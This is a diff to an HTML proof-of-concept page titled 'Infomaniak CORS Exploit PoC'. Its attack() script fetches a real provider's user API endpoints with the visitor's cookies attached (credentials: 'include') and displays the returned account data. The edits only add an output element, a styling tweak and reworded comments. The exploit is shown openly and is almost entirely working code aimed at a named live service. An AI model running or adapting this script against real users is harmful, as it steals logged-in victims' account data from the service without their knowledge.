@@ -4,7 +4,7 @@
   <title>Infomaniak CORS Exploit PoC</title>
   <style>
     body { font-family: Arial; background: #111; color: #0f0; padding: 20px; }
-    pre { background: #000; padding: 10px; border: 1px solid #0f0; }
+    pre  { background: #000; padding: 10px; border: 1px solid #0f0; white-space: pre-wrap; }
   </style>
 </head>
 <body>
@@ -16,7 +16,13 @@
 
 <script>
 async function attack() {
-  const output = document.getElementById('output');
+  // Make sure there is an output element
+  let output = document.getElementById('output');
+  if (!output) {
+    output = document.createElement('pre');
+    output.id = 'output';
+    document.body.appendChild(output);
+  }
 
   const endpoints = [
     "https://api.infomaniak.com/1/user",
@@ -40,7 +46,7 @@ async function attack() {
         credentials: "include"
       });
 
-      const text = await res.text(); // works for JSON or HTML error pages
+      const text = await res.text(); // handles JSON or HTML
       results += `[${url}] STATUS: ${res.status}\n${text}\n\n--------------------------\n\n`;
     } catch (err) {
       results += `[${url}] ERROR: ${err}\n\n--------------------------\n\n`;
@@ -55,4 +61,3 @@ attack();
 
 </body>
 </html>
-
